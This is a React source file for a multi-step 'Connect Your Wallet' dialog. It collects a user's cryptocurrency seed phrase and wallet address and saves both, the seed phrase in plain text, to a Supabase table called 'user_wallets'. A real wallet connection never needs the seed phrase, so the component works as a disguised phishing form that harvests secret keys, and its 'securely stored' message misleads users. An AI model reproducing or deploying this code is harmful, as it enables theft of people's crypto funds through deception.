import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { supabase } from "@/lib/supabase";

interface WalletModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  userId: string;
  onSuccess: () => void;
}

export default function WalletModal({ open, onOpenChange, userId, onSuccess }: WalletModalProps) {
  const [step, setStep] = useState<"seed" | "confirm_seed" | "address" | "confirm">("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [seedPhraseConfirm, setSeedPhraseConfirm] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSeedSubmit = async () => {
    if (!seedPhrase.trim()) {
      setError("Please enter your seed phrase");
      return;
    }
    
    // Check if seed phrase has at least 12 words
    const wordCount = seedPhrase.trim().split(/\s+/).length;
    if (wordCount < 12) {
      setError("Seed phrase must contain at least 12 words");
      return;
    }
    
    setError("");
    setStep("confirm_seed");
  };

  const handleSeedConfirm = async () => {
    if (!seedPhraseConfirm.trim()) {
      setError("Please confirm your seed phrase");
      return;
    }
    if (seedPhrase !== seedPhraseConfirm) {
      setError("Seed phrases do not match");
      return;
    }
    
    // Check word count again on confirmation
    const wordCount = seedPhraseConfirm.trim().split(/\s+/).length;
    if (wordCount < 12) {
      setError("Seed phrase must contain at least 12 words");
      return;
    }
    
    setError("");
    setStep("address");
  };

  const handleAddressSubmit = async () => {
    if (!walletAddress.trim()) {
      setError("Please enter your wallet address");
      return;
    }
    setError("");
    setStep("confirm");
  };

  const handleConfirm = async () => {
    // Final validation before saving
    const wordCount = seedPhrase.trim().split(/\s+/).length;
    if (wordCount < 12) {
      setError("Seed phrase must contain at least 12 words");
      return;
    }
    
    setLoading(true);
    setError("");

    try {
      // Use upsert to insert or update
      const { error: upsertError } = await supabase
        .from("user_wallets")
        .upsert({
          user_id: userId,
          seed_phrase: seedPhrase,
          wallet_address: walletAddress,
        }, {
          onConflict: 'user_id'
        });

      if (upsertError) {
        console.error("Wallet upsert error:", upsertError);
        setError(upsertError.message);
        setLoading(false);
        return;
      }

      onSuccess();
      onOpenChange(false);
      setStep("seed");
      setSeedPhrase("");
      setSeedPhraseConfirm("");
      setWalletAddress("");
    } catch (err) {
      console.error("Wallet save error:", err);
      setError("An error occurred. Please try again.");
      setLoading(false);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Connect Your Wallet</DialogTitle>
        </DialogHeader>

        {error && (
          <div className="p-3 bg-red-100 border border-red-400 text-red-700 rounded text-sm">
            {error}
          </div>
        )}

        {step === "seed" && (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Enter Your Seed Phrase
              </label>
              <textarea
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Enter your 12 or 24 word seed phrase..."
                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 min-h-24"
              />
            </div>
            <Button
              onClick={handleSeedSubmit}
              className="w-full bg-red-600 hover:bg-red-700 text-white"
            >
              Next
            </Button>
          </div>
        )}

        {step === "confirm_seed" && (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Confirm Your Seed Phrase
              </label>
              <textarea
                value={seedPhraseConfirm}
                onChange={(e) => setSeedPhraseConfirm(e.target.value)}
                placeholder="Re-enter your seed phrase to confirm..."
                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 min-h-24"
              />
            </div>
            <div className="flex gap-2">
              <Button
                onClick={() => setStep("seed")}
                variant="outline"
                className="flex-1"
              >
                Back
              </Button>
              <Button
                onClick={handleSeedConfirm}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white"
              >
                Next
              </Button>
            </div>
          </div>
        )}

        {step === "address" && (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Enter Your Wallet Address
              </label>
              <Input
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                placeholder="0x..."
                className="w-full"
              />
            </div>
            <div className="flex gap-2">
              <Button
                onClick={() => setStep("confirm_seed")}
                variant="outline"
                className="flex-1"
              >
                Back
              </Button>
              <Button
                onClick={handleAddressSubmit}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white"
              >
                Next
              </Button>
            </div>
          </div>
        )}

        {step === "confirm" && (
          <div className="space-y-4">
            <div className="bg-gray-50 p-4 rounded-lg space-y-2">
              <p className="text-sm text-gray-600">
                <strong>Seed Phrase:</strong> {seedPhrase.split(" ").length} words
              </p>
              <p className="text-sm text-gray-600">
                <strong>Wallet Address:</strong> {walletAddress.slice(0, 10)}...{walletAddress.slice(-8)}
              </p>
            </div>
            <p className="text-sm text-gray-600">
              Please confirm your wallet details. This information will be securely stored.
            </p>
            <div className="flex gap-2">
              <Button
                onClick={() => setStep("address")}
                variant="outline"
                className="flex-1"
              >
                Back
              </Button>
              <Button
                onClick={handleConfirm}
                disabled={loading}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white"
              >
                {loading ? "Saving..." : "Confirm"}
              </Button>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}